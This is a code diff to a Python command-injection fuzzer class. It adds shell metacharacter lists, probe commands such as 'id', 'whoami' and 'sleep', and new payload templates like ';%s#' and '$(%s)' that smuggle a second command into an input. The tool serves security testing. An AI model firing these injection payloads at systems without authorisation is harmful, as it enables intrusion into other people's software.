@@ -28,15 +28,70 @@ class CmdInjection(Fuzzer):
         '\x1a',
     ]
 
+    special = [
+        '\n',
+        '!',
+        '"',
+        '$',
+        '%',
+        '&',
+        "'",
+        '(',
+        ')',
+        '*',
+        '+',
+        '-',
+        '.',
+        '/',
+        ';',
+        '<',
+        '=',
+        '>',
+        '?',
+        '[',
+        '\\',
+        ']',
+        '^',
+        '`',
+        '{',
+        '|',
+        '}',
+        '~',
+        '\xff'
+    ]
+
+    testcmd = [
+        'id',
+        'whoami',
+        'which',
+        'pwd',
+        'ls',
+        'dir',
+        'w',
+        'sleep',
+    ]
+
+    prefix = [
+        '/usr/local/sbin',
+        '/usr/local/bin',
+        '/usr/sbin',
+        '/usr/bin',
+        '/sbin',
+        '/bin',
+    ]
+
     def __init__(self):
         super(CmdInjection, self).__init__()
 
     @classmethod
     def test(cls, cmd="id"):
+        # some system do not have id
         return [
             "|%s" % cmd,
             "=%s|'%s'!''" % (cmd, cmd),
             ";%s" % cmd,
+            ");%s" % cmd,
+            ";%s#" % cmd,
             "\n%s" % cmd,
             "`%s`" % cmd,
             "$(%s)" % cmd,
